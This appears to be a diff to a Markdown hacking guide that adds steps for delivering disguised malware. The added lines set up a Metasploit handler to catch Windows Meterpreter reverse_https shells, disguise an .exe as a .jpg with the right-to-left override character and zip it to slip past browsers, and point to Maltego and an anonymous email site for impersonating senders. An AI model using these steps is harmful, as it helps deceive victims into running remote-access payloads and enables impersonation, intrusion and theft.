@@ -369,11 +369,32 @@ EndFunc   ;==>_GetURLImage
   Destination: .exe file
 * use www.iconarchive.com to download and use a custom icon. (in case of an pdf, word,...)
   in case of an image: go to www.rw-designer.com/image-to-icon to an `.ico` file.
+* Put the file you want the target to download on a webserver.
+#### Wait for incomming connections
+> msfconsole
+> use exploit/multi/handler
+> show options
+> set PAYLOAD windows/meterpreter/reverse_https
+LHOST eigen ip
+LPORT 8080
+> exploit
 
-#### TO BE CONTINUED
+### Spoofing .exe file to any other file type
+For example:
+* You have a file: gtr.exe and you want to make it a .jpg
+* We need to use a `right-to-left character`.
+##### How to find `right-to-left character`
+Search for characters, search for right to left override and copy the character.
+
+* Name the file gtrgpj.exe and put a `right-to-left character` between r and g.
+=> gtrexe.jpg
+* Zip the file otherwise, your internetbrowser will remove the `right-to-left character`.
 
 ## Send mails as any person you want
 
+Using Maltego, you can find people close to your target.
+
+* search for https://anonymousemail.me
 
 
 
